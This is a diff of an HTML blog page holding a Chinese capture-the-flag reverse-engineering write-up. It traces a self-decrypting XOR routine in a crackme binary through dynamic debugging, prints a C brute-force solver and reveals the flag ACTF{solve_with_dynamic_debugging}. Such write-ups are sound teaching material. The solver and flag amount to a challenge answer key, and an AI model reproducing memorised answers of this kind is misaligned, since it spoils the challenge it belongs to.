+  v11 = qword_55FA3685F0D8;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">14</span><span style="color:#c0c5ce;">) = qword_55FA3685F0D0;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">) = v11;
+  *((_WORD *)v3 + </span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">) = word_55FA3685F0E0;
 </span></code></pre>
 <p>这一段其实耐心看完不难发现，完成的其实只是将以<code>func_s</code>为首地址的之后130个字节的数据拷贝到以<code>v3</code>为首地址的空间里，相当于<code>memcpy((char *)v3,func_s,130);</code>。之后的内容则是将这段数据从<code>v3</code>开始，每个字节都异或<code>0x23</code>:</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">  v17 = v14;</span><span style="color:#c0c5ce;">
-  v16 = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-  </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">( v16 &lt;= </span><span style="color:#d08770;">129 </span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
-  {</span><span style="color:#c0c5ce;">
-    *v17 ^= </span><span style="color:#d08770;">0x23</span><span style="color:#b48ead;">u</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-    ++v16;</span><span style="color:#c0c5ce;">
-    ++v17;</span><span style="color:#c0c5ce;">
-  }</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;">  v17 = v14;
+  v16 = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+  </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">( v16 &lt;= </span><span style="color:#d08770;">129 </span><span style="color:#c0c5ce;">)
+  {
+    *v17 ^= </span><span style="color:#d08770;">0x23</span><span style="color:#b48ead;">u</span><span style="color:#c0c5ce;">;
+    ++v16;
+    ++v17;
+  }
 </span></code></pre>
 <p>完成这一步后出现了一个不太寻常的操作：<code>((void (__fastcall *)(char *, char *))v14)(v13, v13);</code> 将这一段数据当作了函数并且传入参数<code>v13</code>调用了它。最后就到了验证flag的环节。flag当然不会原模原样的放在验证数组里（经过两次挨打的出题人终于不再图样了），所以我们还是要搞清楚这段数据被当作函数调用以后对用户的输入做了什么操作。</p>
 <p>问题来了，该怎么分析这段数据呢？一个比较省力的办法是使用ida的动态调试功能（因为是elf文件所以需要在linux的虚拟机里进行远程调试，具体的操作方法搜一蛤就能找到），在调用这段数据时下断点，程序自己运行到断点处时，单步进入，创建函数后再使用F5功能，就能看到这段数据被当作函数时是怎样的代码。经由上述操作，我们进入了获得了这段函数的代码：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">__int64 __fastcall </span><span style="color:#8fa1b3;">sub_56389A4F1830</span><span style="color:#c0c5ce;">(__int64 </span><span style="color:#bf616a;">a1</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
-{</span><span style="color:#c0c5ce;">
-  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i; </span><span style="color:#65737e;">// [rsp+14h] [rbp-4h]</span><span style="color:#65737e;">
-</span><span style="color:#c0c5ce;">
-  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">( i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; *(_BYTE *)(i + a1); ++i )</span><span style="color:#c0c5ce;">
-    *(_BYTE *)(i + a1) = (*(</span><span style="color:#b48ead;">unsigned </span><span style="color:#c0c5ce;">__int8 *)(i + a1) &lt;&lt; </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">) &amp; ((</span><span style="color:#b48ead;">signed int</span><span style="color:#c0c5ce;">)*(</span><span style="color:#b48ead;">unsigned </span><span style="color:#c0c5ce;">__int8 *)(i + a1) &gt;&gt; </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">) ^ </span><span style="color:#d08770;">0xCC</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-  </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#b48ead;">LL</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-}</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;">__int64 __fastcall </span><span style="color:#8fa1b3;">sub_56389A4F1830</span><span style="color:#c0c5ce;">(__int64 </span><span style="color:#bf616a;">a1</span><span style="color:#c0c5ce;">)
+{
+  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i; </span><span style="color:#65737e;">// [rsp+14h] [rbp-4h]
+
+  </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">( i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; *(_BYTE *)(i + a1); ++i )
+    *(_BYTE *)(i + a1) = (*(</span><span style="color:#b48ead;">unsigned </span><span style="color:#c0c5ce;">__int8 *)(i + a1) &lt;&lt; </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">) &amp; ((</span><span style="color:#b48ead;">signed int</span><span style="color:#c0c5ce;">)*(</span><span style="color:#b48ead;">unsigned </span><span style="color:#c0c5ce;">__int8 *)(i + a1) &gt;&gt; </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">) ^ </span><span style="color:#d08770;">0xCC</span><span style="color:#c0c5ce;">;
+  </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#b48ead;">LL</span><span style="color:#c0c5ce;">;
+}
 </span></code></pre>
 <p>a1为用户输入，经历for循环中的移位、和、异或系列操作后返回。之后就是验证环节。运算操作没有很复杂，以下是解密代码：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">## include&lt;stdio.</span><span style="color:#bf616a;">h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
-</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">() {</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> str[]={</span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x8f</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x98</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x8a</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb7</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xbf</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa3</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xba</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa9</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x93</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xbb</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb8</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa4</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x93</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa8</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa2</span><span style="color:#c0c5ce;">,</span><span style="color:#c0c5ce;">
-	</span><span style="color:#d08770;">0xad</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xaf</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x93</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa8</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa9</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xae</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb9</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xab</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xab</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa2</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xab</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb1</span><span style="color:#c0c5ce;">};</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;i&lt;=</span><span style="color:#d08770;">33</span><span style="color:#c0c5ce;">;i++){</span><span style="color:#c0c5ce;">
-		</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> input = </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">;input&lt;=</span><span style="color:#d08770;">0x7e</span><span style="color:#c0c5ce;">;input++){</span><span style="color:#c0c5ce;">
-			</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> input_m;</span><span style="color:#c0c5ce;">
-			input_m = ((input&lt;&lt;</span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">)&amp;(input&gt;&gt;</span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">)^</span><span style="color:#d08770;">0xcc</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
-			</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(input_m == str[i]){</span><span style="color:#c0c5ce;">
-				</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%c</span><span style="color:#c0c5ce;">&quot;,input);</span><span style="color:#c0c5ce;">
-				</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-			}</span><span style="color:#c0c5ce;">
-		}</span><span style="color:#c0c5ce;">
-	}</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-  </span><span style="color:#c0c5ce;">
-}</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;">## include&lt;stdio.</span><span style="color:#bf616a;">h</span><span style="color:#c0c5ce;">&gt;
+
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">() {
+	</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> str[]={</span><span style="color:#d08770;">0x8d</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x8f</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x98</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x8a</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb7</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xbf</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa3</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa0</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xba</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa9</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x93</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xbb</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb8</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa4</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x93</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa8</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa2</span><span style="color:#c0c5ce;">,
+	</span><span style="color:#d08770;">0xad</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xaf</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x93</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa8</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa9</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xae</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb9</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xab</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xab</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa5</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xa2</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xab</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0xb1</span><span style="color:#c0c5ce;">};
+	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;i&lt;=</span><span style="color:#d08770;">33</span><span style="color:#c0c5ce;">;i++){
+		</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> input = </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">;input&lt;=</span><span style="color:#d08770;">0x7e</span><span style="color:#c0c5ce;">;input++){
+			</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> input_m;
+			input_m = ((input&lt;&lt;</span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">)&amp;(input&gt;&gt;</span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">)^</span><span style="color:#d08770;">0xcc</span><span style="color:#c0c5ce;">);
+			</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(input_m == str[i]){
+				</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%c</span><span style="color:#c0c5ce;">&quot;,input);
+				</span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
+			}
+		}
+	}
+	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+  
+}
 </span></code></pre>
 <p>得到flag：<strong>ACTF{solve_with_dynamic_debugging}</strong></p>
 
+    </div>
   </div>
 
         </div>
